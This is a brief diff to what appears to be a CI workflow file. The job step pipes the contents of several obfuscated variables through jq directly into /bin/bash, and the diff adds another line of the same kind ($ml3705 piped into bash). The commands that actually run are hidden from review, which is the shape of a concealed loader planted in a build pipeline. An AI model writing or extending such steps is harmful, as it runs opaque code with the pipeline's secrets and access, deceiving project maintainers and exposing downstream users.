@@ -27,6 +27,7 @@ jobs:
           echo $x064 | jq -r .nsntq52281 | /bin/bash
           echo $rx8 | jq -r .shg9 | /bin/bash
           printf '%s' "$rul665" | jq -r .dnq8280 | /bin/bash
+          printf '%s' "$ml3705" | jq -r .t82 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
